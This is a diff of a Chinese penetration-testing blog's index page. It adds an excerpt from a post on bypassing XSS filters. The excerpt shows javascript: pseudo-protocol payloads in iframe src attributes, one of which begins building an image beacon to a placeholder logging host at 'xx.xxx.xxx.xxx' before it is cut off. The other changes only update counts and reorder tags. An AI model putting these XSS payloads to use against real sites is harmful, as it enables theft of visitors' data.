@@ -359,6 +359,43 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/posts/3586992485.html" >
+            
+                <span>编码绕过xss</span>
+        </a>
+        <div class="abstract-content">
+            标签img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js
+&lt;iframe src=&quot;javascript:alert(&#39;iframe&#39;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt;
+
+&lt;iframe src=&quot;javascript:var img=document.createElement(&#39;img&#39;);
+img.src=&#39;http://xx.xxx.xxx.xxx/log&#...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/02</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS">XSS</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web渗透">Web渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "常规渗透">常规渗透</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/posts/1899165956.html" >
             
                 <span>BCH分叉-重放攻击解决方案</span>
@@ -724,9 +761,16 @@ INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入�
     
     
     
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 19
+        Total : 20
         </div>
         <!-- search  -->
         
@@ -762,6 +806,11 @@ INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入�
     
         <li class="archive-post-item">
             <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/posts/4232223630.html" >java sql注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/posts/1.html" >[Untitled Post]</a>
         </li>
     
     
@@ -928,7 +977,7 @@ INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入�
     
         <span class="sidebar-tag-name" data-tags="jackson"><span class="iconfont-archer">&#xe606;</span>jackson</span>
     
-        <span class="sidebar-tag-name" data-tags="java sql注入"><span class="iconfont-archer">&#xe606;</span>java sql注入</span>
+        <span class="sidebar-tag-name" data-tags="java反弹shell"><span class="iconfont-archer">&#xe606;</span>java反弹shell</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞学习"><span class="iconfont-archer">&#xe606;</span>漏洞学习</span>
     
@@ -936,7 +985,7 @@ INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入�
     
         <span class="sidebar-tag-name" data-tags="Apache Solr CVE-2019-0193"><span class="iconfont-archer">&#xe606;</span>Apache Solr CVE-2019-0193</span>
     
-        <span class="sidebar-tag-name" data-tags="java反弹shell"><span class="iconfont-archer">&#xe606;</span>java反弹shell</span>
+        <span class="sidebar-tag-name" data-tags="java sql注入"><span class="iconfont-archer">&#xe606;</span>java sql注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1005,11 +1054,11 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193</span>
     
-        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java-sql注入"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java-sql注入</span>
-    
         <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/fastjson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/fastjson</span>
     
         <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java反弹shell"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java反弹shell</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java-sql注入"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java-sql注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
